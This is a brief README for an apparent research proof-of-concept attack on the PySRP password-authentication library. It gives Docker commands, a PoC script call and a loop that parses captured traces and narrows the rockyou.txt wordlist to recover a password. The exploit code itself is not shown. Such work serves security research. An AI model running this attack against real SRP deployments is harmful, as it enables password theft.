# Proof of Concept attack on PySRP

Build and run container :
```
docker build --rm -t parasite_pysrp .
docker run -it parasite_pysrp
```

Run PoC :
```
./poc.sh
trace_parser.py traces_admin_password_0102030405060708/* > infos_admin_password_0102030405060708.txt
for info in $(cat infos_admin_password_0102030405060708.txt | grep -v "Error");
do
    dict_reducer /usr/share/dict/rockyou.txt $info
done
```